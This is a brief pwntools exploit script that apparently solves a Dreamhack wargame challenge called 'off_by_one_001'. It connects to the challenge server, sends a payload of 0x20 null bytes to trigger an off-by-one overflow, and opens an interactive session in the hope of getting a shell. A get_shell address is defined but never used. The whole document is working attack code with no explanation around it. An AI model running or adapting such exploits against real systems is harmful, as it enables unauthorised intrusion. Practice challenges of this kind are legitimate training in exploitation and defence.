from pwn import*

#p = process("./off_by_one_001")
p = remote('host3.dreamhack.games',24127)


get_shell = 0x080485db
payload = b"\x00"*0x20
p.send(payload)

p.interactive()
